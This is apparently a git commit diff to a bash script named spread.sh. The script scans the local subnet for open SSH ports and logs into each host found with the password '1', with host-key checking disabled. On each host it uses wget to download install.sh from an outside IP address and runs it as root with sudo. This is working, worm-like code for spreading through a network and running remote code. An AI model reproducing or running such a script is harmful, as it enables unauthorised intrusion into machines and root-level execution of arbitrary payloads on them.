2e83e61e11cfb95613790613546b1ce35b82d515
nitrogen <liquid.nitrogenium@gmail.com>
2022-11-01 01:00:48 +0500

    wip

--- public/spread.sh
+++ public/spread.sh
@@ -1,19 +1,19 @@
 #!/bin/bash
 
- for m in {1..254..1}
- 	do
+base_ip=$(hostname -I | cut -d"." -f1-3)
+
      for i in {1..254..1}
         do
-          if nc -w 1 -zv 192.168.$m.$i 22 &>> /dev/null
+          if nc -w 1 -zv $base_ip$i 22 &>> /dev/null
           then
-            echo "Processing 192.168.$m.$i  ================  \n"
-            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.$m.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
+            echo "Processing $base_ip$i  ================  \n"
+            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@$base_ip$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
             sleep 5
           else
-            echo "Empty 192.168.$m.$i"
+            echo "Empty $base_ip$i"
           fi
      done
-done
+
 
 #sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"
 
